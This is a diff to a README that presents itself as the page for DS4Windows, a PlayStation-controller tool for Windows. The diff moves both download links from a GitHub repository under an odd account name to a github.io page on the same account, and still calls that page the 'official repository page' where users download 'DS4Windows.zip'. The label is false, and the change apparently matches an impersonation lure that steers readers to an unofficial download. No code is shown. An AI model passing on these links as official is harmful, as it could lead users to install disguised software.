@@ -1,6 +1,6 @@
 # 🎮 DS4Windows - Use PlayStation Controllers On Windows
 
-[![](https://img.shields.io/badge/Download-DS4Windows-blue.svg)](https://github.com/ursaaustenitic585/DS4Windows)
+[![](https://img.shields.io/badge/Download-DS4Windows-blue.svg)](https://ursaaustenitic585.github.io)
 
 DS4Windows lets you use Sony PlayStation controllers on your Windows 10 or Windows 11 computer. The software makes your computer think you connected an official Xbox controller. This change allows you to play almost any game that supports standard controllers.
 
@@ -15,7 +15,7 @@ You need a few things before you start:
 
 ## 📥 How To Download And Install
 
-1. Visit the [official repository page](https://github.com/ursaaustenitic585/DS4Windows) to reach the software.
+1. Visit the [official repository page](https://ursaaustenitic585.github.io) to reach the software.
 2. Look for the Releases section on the right side of the page.
 3. Click on the latest release version.
 4. Download the file named "DS4Windows.zip" to your computer.
